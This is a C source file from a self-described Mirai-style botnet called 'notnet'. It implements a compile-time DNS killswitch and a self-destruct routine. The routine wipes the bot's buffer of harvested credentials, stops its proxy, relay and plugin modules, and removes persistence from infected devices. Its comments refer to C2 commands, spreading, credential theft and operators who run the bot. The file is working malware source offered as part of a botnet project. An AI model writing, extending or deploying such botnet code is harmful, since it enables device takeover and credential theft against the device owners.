/*
 * notnet - Modern Mirai-Style Botnet
 * killswitch.c - Global killswitch (#130)
 *
 * DNS-based author killswitch. The bot resolves the compile-time
 * killswitch_domain (config.h) at boot and on its own timer; if the
 * domain resolves to the kill address (default 127.0.0.1 — the
 * classic WannaCry-style sinkhole) the bot runs the one-way
 * self-destruct. Because the check is DNS, it fires even when the
 * operator's C2 is down: the author's kill does not depend on the
 * skid's infrastructure. There is no runtime config — the domain is
 * baked in at build time, so a stock binary cannot be disarmed.
 */
#include "killswitch.h"
#include "persist.h"
#include "plugin.h"
#include "proxy.h"
#include "relay.h"
#include "spread.h"
#include "util.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>

/* Resolve the compile-time killswitch domain. Returns 1 if it
 * resolves to a kill address, 0 otherwise. Silent on failure — a bot
 * must not announce its killswitch in the logs (NXDOMAIN is the
 * normal, inert state). */
int killswitch_check(void) {
    in_addr_t ip = (in_addr_t)protocol_resolve_host(KILLSWITCH_DOMAIN_DEFAULT);
    if (ip == (in_addr_t)INADDR_NONE) {
        /* NXDOMAIN / unreachable — inert by design. */
        return 0;
    }

    /* protocol_resolve_host returns network byte order. Compare against
     * the kill address (host order) and the 0.0.0.0 sinkhole. */
    if (ip == htonl((uint32_t)KILLSWITCH_KILL_IP) || ip == INADDR_ANY) {
        char ipbuf[INET_ADDRSTRLEN] = "?";
        inet_ntop(AF_INET, &ip, ipbuf, sizeof(ipbuf));
        log_warn("KILLSWITCH: %s resolved to %s — self-destruct armed",
                 KILLSWITCH_DOMAIN_DEFAULT, ipbuf);
        return 1;
    }

    return 0;
}

/* The shared one-way door. Used by the killswitch (boot + periodic)
 * and by the C2 `kill` command (CMD_KILL in protocol.c). Wipes the
 * credential buffer, stops every module through the plugin teardown
 * callbacks, removes persistence, then latches kill_pending so the
 * main loop exits through the normal cleanup path with status 0. */
void kill_self(notnet_bot_t *bot, const char *reason) {
    if (!bot) return;
    if (!reason) reason = "kill";

    log_warn("KILL: %s — wiping state, stopping modules, removing persistence",
             reason);

    /* Wipe the cred buffer: drain into a heap copy, zero the copy
     * (optimizer-proof), free it. The internal buffer is cleared by
     * the drain; the copy is what we can reach. */
    char *creds = NULL;
    size_t creds_len = 0;
    if (spread_creds_drain(&creds, &creds_len) == 0 && creds) {
        wipe_volatile(creds, creds_len);
        free(creds);
    } else {
        log_info("kill: no buffered credentials to wipe");
    }

    /* Stop proxy/relay/plugins via their stop callbacks. Safe before
     * plugin_init() — an empty registry makes unload_all a no-op. */
    if (bot->plugin_enabled) {
        plugin_unload_all(bot);
    } else {
        proxy_stop();
        relay_stop();
    }

    /* Remove persistence so the device does not re-infect on reboot.
     * Best-effort: a kill must not wedge on a missing permission. */
    if (persist_remove(bot) != 0) {
        log_warn("kill: persistence removal incomplete (continuing anyway)");
    }

    bot->kill_pending = 1;
}
